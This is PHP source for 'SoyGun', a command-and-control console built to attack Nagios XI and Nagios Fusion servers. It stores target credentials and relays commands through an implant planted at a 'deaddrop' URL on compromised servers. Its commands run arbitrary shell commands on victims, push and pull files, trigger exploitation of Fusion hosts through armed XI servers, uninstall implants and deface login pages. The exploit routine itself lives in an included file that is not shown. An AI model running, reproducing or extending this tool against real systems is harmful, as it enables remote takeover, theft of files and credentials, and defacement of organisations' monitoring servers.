<?php
/**
 * SoyGun Command & Control CLI
 * Connects to a deaddrop agent and reads/writes commands
 */

define("CONFIG_FILE", "soygun.json");

include("implant.php");

$root_dir = getcwd() . "/";
$tmp_dir = $root_dir . 'tmp/';
if(!file_exists($tmp_dir)) {
    mkdir($tmp_dir);
}
$implant_path = $root_dir . "implant.php";
print($implant_path);

function json_print($obj)
{
	print json_encode($obj, defined("JSON_PRETTY_PRINT") ? JSON_PRETTY_PRINT : 0) . "\n";
}

$config = array();
function print_config($config) {
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~ Start Config ~~~~~~~~~~~~~~~~~~~~~~~~\n");
    print("Self IP: {$config["self_ip"]}\n");
    print("Deaddrop: {$config["deaddrop"]}\n");
	json_print(array("XIs" => $config["xis"], "Fusions" => $config["fusions"]));
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~ End Config ~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n");
}

if(!function_exists("readline")) {
    function readline($prompt = null){
        if($prompt){
            echo $prompt;
        }
        $fp = fopen("php://stdin","r");
        $line = rtrim(fgets($fp, 1024));
        return $line;
    }
}


/**
 * Load config from soygun.conf
 */
function load_config() {
    $config = @file_get_contents(CONFIG_FILE);
    if(!empty($config)) {
        $config = json_decode($config, true);
        print("Config loaded from " . CONFIG_FILE . "...\n");
    } else {
        $config = array(
            "self_ip" => getHostByName(getHostName()), // Self IP Address
            "xis" => array(),       // List of XIs
            "fusions" => array(),   // List of Fusions
            "deaddrop" => ""        // Deaddrop to use when sending or recieving messages
        );
    }
    return $config;
}

/**
 * Save config to soygun.json
 */
function save_config() {
    global $config;
    file_put_contents(CONFIG_FILE, json_encode($config, defined("JSON_PRETTY_PRINT") ? JSON_PRETTY_PRINT : 0));
    print("Running config saved to " . CONFIG_FILE . "!\n");
}

/* Header to print when starting SoyGun CLI */
$header = <<<STR

                      ~~~ SoyGun CLI ~~~
            Nagios Fusion / XI - Attack Platform
 

           .-.____________________.-.
     ___ _.' .-----.    _____________|======+--------------------+
    /_._/   (      |   /_____________|      |        SoyGun      |
      /      `  _ ____/                     | NAGIOS XI / FUSION |
     |_      .\( \\\\                         |   Attack Platform  |
    .'  `-._/__`_//                         |____________________|
  .'       |""""'
 /        /
/        |
|        '
|         \
`-._____.-'


STR;

/* CLI Prompt that shows current context */
function print_prompt() {
    global $context;
    print("SoyGun [{$context["type"]}/{$context["ip"]}]> \n");
}

/* Print the help message */
function print_help() {
    global $header;
    print($header);
    print <<<STR

 commands:
    help | ?        Print this help.
    Exploitation:
        exploit         Exploit Nagios XI (only valid in Nagios XI context)
        arm                 Arm Nagios XI to exploit Nagios Fusion
        unarm               Unarm Nagios XI

    Standard Operation:
        cd <xi|fusion> <IP>      Change context into XI or Fusion of given ID
		add xi <IP> <username> <password>
		add fusion <IP>
		del <xi|fusion> <IP>
        get | sync | CR     Get messages from DeadDrop
        set [thing]
            selfip
        show [thing]
             context | ctx
             selfip | sip
             xis
             fusions
             run | config
             start
        save
        exec <command>      Execute shell command in current context
		add_flames			Add flames to Nagios logo
		\n\n\n
STR;
}

/**
 * Send a message using DeadDrop from the current context
 */
function send_message($message) {
    global $context;
    global $config;
    $dest = $context["ip"];
    $messages = array();
    $messages[] = dd_add($config["self_ip"], $dest, $message);
    dd_drop($config["deaddrop"], $messages);
}

print($header);
$config = load_config();

// Default context
$default_context = array(
    "ip"=> $config["self_ip"],
    "type"=> "local",
);
$context = $default_context;

/**
 * Process any messages recieved - only handling essentials right now
 */
function process_message($message) {
    global $config;

    $data = explode(":", $message["data"]);
    $type = array_shift($data);
    if($type == "RESP") {
        $action = array_shift($data);
        switch($action) {
            case "FUSEDXI":
                $fused_xis = unserialize(join(":", $data));
                print("Recieved Fused Servers from {$message["src"]}\n");
                $mod_count = 0;
                $add_count = 0;
                foreach($fused_xis as $fused_xi) {
                    $set = FALSE;
                    // Update the default XI details
                    // Check if we already have this XI registered
                    foreach($config["xis"] as $xi) {
                        if($fused_xi["ip"] == $xi["ip"]) {
                            $set = TRUE;
                            $mod_count++;
                            $xi["url"] = $fused_xi["url"];
                            $xi["username"] = $fused_xi["username"];
                            $xi["password"] = $fused_xi["password"];
                            $xi["name"] = $fused_xi["name"];
                            break;
                        }
                    }
                    if($set == FALSE) {
                        $add_count++;
                        $config["xis"][] = $fused_xi;
                    }
                }
                print(" * {$mod_count} XIs modified.\n");
                print(" * {$add_count} new XIs added.\n");
            break;
            case "EXPLOIT":
                $result = array_shift($data);
                if($result == "FUSION_Success") {
                    print("Recieved fusion exploit success from {$message["src"]}\n");
                    $fusion_ip = array_shift($data);
                    $config["fusions"][] = array(
                        "type" => "fusion",
                        "ip" => $fusion_ip,
                        "exploited" => TRUE,
                        "parent" => $message["src"]
                    );
                    print(" * New Fusion added @ {$fusion_ip}\n");
                    // Tell Fusion about us
                    $msg = array(dd_add($config["self_ip"], $fusion_ip, "CLI_IP:{$config["self_ip"]}"));
                    dd_drop($config["deaddrop"], $msg);
                }
            break;
            case "GET":
                $src = array_shift($data);
                $dst = array_shift($data);
                $data = base64_decode(array_shift($data));
                print("Writing {$dst} from {$message["src"]}:{$src}\n");
                file_put_contents($dst, $data);
            break;
            default:
				if(isset($message["data"]))
					print("Recieved message '{$message['data']}' from {$message['src']}\n");
				else
					json_print($message);
                break;
        }
    } elseif ($type == "BEACON") {
        $action = array_shift($data);
        if($action == "XI") {
            print("Recieved beacon from XI @ {$message["src"]}\n");
            foreach($config["xis"] as $xi)
			{
                if($xi["ip"] == $message["src"]) {
                    print(" * Setting as exploited\n");
                    $xi["exploited"] = TRUE;
                }
            }
        }
    } 
    else {
        json_print($message);
    }
}

/****************************************************************************************************/
/*************************************** SOYGUN CLI INFINITE LOOP ***********************************/
/****************************************************************************************************/

while(1) {
    print_prompt();
    $raw = readline();
    $command = explode(" ", $raw);
    $action = array_shift($command);
    switch($action) {
        case "quit":
        case "exit":
            print("Goodbye!\n");
            exit(0);
        break;
        case "save": // Save running config
            save_config();
        break;
        case "load": // Load config from startup config
            $config = load_config();
        break;
        case "set":
            $item = array_shift($command);
            switch($item) {
                case "selfip":
                    $config["self_ip"] = array_shift($command);
                    $default_context["ip"] = $config["self_ip"];
                    // If we are in default context update the context to new default
                    if($context["type"] == "local") {
                        $context = $default_context;
                    }
                    print("Self IP set to {$config["self_ip"]}\n");
                break;
                case "deaddrop":
                    // DeadDrop URL
                    $config["deaddrop"] = array_shift($command);
                break;
            }
        break;
        case "add":
            $type = strtolower(array_shift($command));
            if($type == "xi") {
                if(count($command) != 3) {
                    print("ERROR: Wrong commands 'add xi <ip> <username> <password>'\n");
                    break;
                }
                $xi_ip = array_shift($command);
                $xi = array(
                    "type" => "xi",
                    "ip" => $xi_ip,
                    "url" => "http://{$xi_ip}/nagiosxi",
                    "username" => array_shift($command),
                    "password" => array_shift($command),
                    "deaddrop" => "http://{$xi_ip}/nagiosxi/includes/implant.php?deaddrop",
                    "parent" => $config["self_ip"],
                    "exploited" => FALSE

                );
                $config["xis"][$xi_ip] = $xi;
                print("New XI Added\nXIs:\n");
				print(implode("", array_map(function ($name){ return "*  ".$name."\n"; }, array_keys($config["xis"]))) . "\n"); 

                // If no deaddrop is configured set it to this XI
                if($config["deaddrop"] == "") {
                    print("No DeadDrop currently set... ");
                    $config["deaddrop"] = $xi["deaddrop"];
                    print("now set to: {$config["deaddrop"]}\n");
                }
            }
            // Adding a Fusion
            elseif ($type == "fusion") {
				$ip = array_shift($command);
                $config["fusions"][$ip] = array(
                    "type" => "fusion",
                    "ip" => $ip,
                    "exploited" => FALSE
                );
                print("New Fusion Added. Fusions: \n");
				print(implode("", array_map(function ($name){ return "*  ".$name."\n"; }, array_keys($config["fusions"]))) . "\n"); 
            }
        break;
		case "del":
		case "delete":
			$type = strtolower(array_shift($command));
			$name = array_shift($command);
			switch($type)
			{
				case "xi":
					unset($config["xis"][$name]);
					break;
				case "fusion":
					unset($config["fusions"][$name]);
					break;
				default:
					print("Bad type\n");
					return;
			}
			print("Done.\n");
		break;
        case "":
        case "sync":
            $dests = array($config["self_ip"]);
            while(count($command) > 0) {
                $dests[] = array_shift($command);
            }
            $Messages = dd_pickup($config["deaddrop"], $dests);
            if(count($Messages) > 0) {
                foreach($Messages as $Message) {
                    $Message = unserialize($Message);
                    process_message($Message);
                }
            }
        break;
        case "send":
            if(count($command) != 1) {
                print("ERROR: Bad Args! Usage: send <message>\n");
            } else {
                if($context["ip"] == "localhost") {
                    print("Cannot send message to localhost. Change context to XI or Fusion.\n");
                } else {
                    $message = join(" ", $command);
                    print("Sending message '{$message}' to {$context["ip"]}\n");
                    send_message($message);
                }
            }
        break;
        case "?":
        case "help":
            print_help();
        break;
        case "exe":
        case "exec":
            $cmdline = join(" ", $command);
            print("Executing '{$cmdline}' on {$context["ip"]}.\n");
            if($context["type"] == "local") {
                print(shell_exec($cmdline));
            } else {
                send_message("EXEC:" . $cmdline);
            }
        break;
        case "uninstall":
            if($context["type"] == "local") {
                print("Cannot uninstall non-XI context. Change context to an exploited endpoint.\n");
            } else {
                print("Uninstalling {$context["type"]} @ {$context["ip"]}\n");
                send_message("UNINSTALL");
            }
        break;
        case "arm":
            if($context["type"] == "xi") {
                print("Arming XI on {$context["ip"]}\n");
                send_message("ARM");
            } else {
                print("Cannot arm non-XI context. Change context to an exploited XI.\n");
            }
        break;
        case "unarm":
            if($context["type"] == "xi") {
                print("Unarming XI on {$context["ip"]}\n");
                send_message("UNARM");
            } else {
                print("Cannot unarm non-XI context. Change context to an exploited XI.\n");
            }
        break;
        case "ping":
            if($context["type"] == "local") {
                print("Cannot ping localhost. Change context to ping.\n");
            } else {
                print("Pinging {$context["ip"]}.\n");
                send_message("PING");
            }
        break;
        case "put":
            $src = array_shift($command);
            $dst = array_shift($command);
            $data = base64_encode(file_get_contents($src));
            print("Sending {$src} to {$context["ip"]}:{$dst}\n");
            send_message("PUT:{$dst}:{$data}");
        break;
        case "get":
            $src = array_shift($command);
            $dst = array_shift($command);
            print("Copying {$dst} from {$context["ip"]} to {$src}\n");
            send_message("GET:{$src}:{$dst}");
        break;
        case "exp":
        case "exploit":
            if($context["type"] == "xi") {
                if(!isset($context["parent"]) || ($context["parent"] == $config["self_ip"])) {
                    $context["exploited"] = TRUE;
                    exploit_xi($context);
                } else {
                    $context["exploited"] = TRUE;
                    $command = "EXPLOIT:" . $context["ip"];
                    send_message($command);
                }
            } else {
                print("Cannot exploit non-XI context. Change context to an XI.\n");
            }
        break;
        case "cd":
            $type = strtolower(array_shift($command));
            if(empty($type) or $type == "-" or $type == "home") {
                $context = $default_context;
            } elseif ($type == "xi" or $type == "fusion") {
                $index = array_shift($command);
				if(!isset($config[$type . "s"][$index]))
				{
					print "Can't find requested context.\n";
					break;
				}
                $context = $config[$type . "s"][$index];
            } else {
                print("Cannot change context into unkown type of '{$type}'.\n");
            }
        break;
        case "sh":
        case "sho":
        case "show":
            $object = array_shift($command);
            switch($object) {
                case "xi":
                case "xis":
                    json_print($config["xis"]);
                break;
                case "sip":
                case "selfip":
                    json_print($config["self_ip"] . "\n");
                break;
                case "fus":
                case "fusion":
                case "fusions":
                    json_print($config["fusions"]);
                break;
                case "ctx":
                case "context":
                    json_print($context);
                break;
                case "run":
                case "conf":
                case "config":
                    print_config($config);
                break;
                case "start":
                    print_config(load_config());
                break;
                default:
                    print("ERROR: Unknown thing to show '{$object}'\n");
            }
        break;
		case "add_flames":
			switch($context["type"])
			{
				case "xi":
					$data = file_get_contents("xi_loginsplash.png");
					$remote_filename = BASE_NAGIOSXI_DIR . "/html/flames.png";
					break;
				case "fusion":
					$data = file_get_contents("fusion_loginsplash.png");
					$remote_filename = BASE_NAGIOSFUSION_DIR . "/html/flames.png";
					break;
				default:
					print "Bad context";break;
			}
			$data = base64_encode($data);
            print("Uploading flames\n");
            send_message("PUT:{$remote_filename}:{$data}");
			print("Adding flames!\n");
			send_message("ADD_FLAMES");
			break;
        default:
            $bad_command = join("", $command);
            print("ERROR: Unknown Command: {$action} {$bad_command}\n");
    }
    unset($command);
}

?>